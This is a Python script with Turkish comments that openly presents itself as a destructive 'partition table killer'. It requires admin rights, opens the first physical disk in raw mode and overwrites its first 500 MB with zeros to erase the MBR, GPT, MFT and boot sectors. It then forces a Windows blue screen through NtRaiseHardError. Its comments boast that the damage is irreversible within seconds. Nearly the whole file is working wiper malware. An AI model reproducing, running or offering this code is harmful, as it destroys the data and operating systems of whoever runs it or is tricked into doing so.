import sys
import ctypes
import os
import random

# --- KIYAMET KOMBOSU: MFT & PARTITION TABLE KILLER ---
# DİKKAT: Bu kod çalıştığı an diskteki tüm bölümler (C:, D:) kaybolur.
# Saniyeler içinde geri dönüşsüz hasar verir.

def kill_system():
    # Windows'u anında mavi ekrana düşür (Critical Process Died)
    ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
    ctypes.windll.ntdll.NtRaiseHardError(0xc0000221, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))

def black_hole():
    print("--- PROJECT: BLACK HOLE BAŞLATILIYOR ---")
    print("[!] Hedef: Dosya Sistemi Haritası (MFT & Partition Table)")
    
    # Windows'un kurulu olduğu fiziksel disk
    drive = r"\\.\PhysicalDrive0"
    
    # 1 MB'lık boş veri blokları
    buffer_size = 1024 * 1024 
    void_data = b'\x00' * buffer_size
    
    try:
        # Diski "Ham" (Raw) modda aç
        with open(drive, "r+b") as disk:
            print("[!] Harita yakılıyor...")
            
            # Diskin sadece BAŞTAKİ kritik 500 MB'ını sil
            # Bu alan MBR, GPT, MFT ve Boot sektörlerini içerir.
            # 1 TB silmek yerine burayı silmek 2 saniye sürer ve aynı etkiyi yapar.
            
            for i in range(500): # 500 MB Sil
                disk.write(void_data)
                print(f"\r[+] {i} MB Kritik Veri Yok Edildi...", end="")
                
            print("\n[!] DİSK ARTIK RAW FORMATINDA. ERİŞİM KAYBEDİLDİ.")
            
    except PermissionError:
        print("[-] Yönetici izni yok!")
        return
    except Exception as e:
        # Disk haritası silinince Windows okuma/yazma yapamayacağı için hata verecektir.
        print("Sistem kör oldu. Çöküş başlıyor...")

    # SON VURUŞ: Mavi Ekran
    kill_system()

if __name__ == "__main__":
    # Yönetici mi?
    if not ctypes.windll.shell32.IsUserAnAdmin():
        print("!!! YÖNETİCİ OLARAK ÇALIŞTIR !!!")
    else:
        black_hole()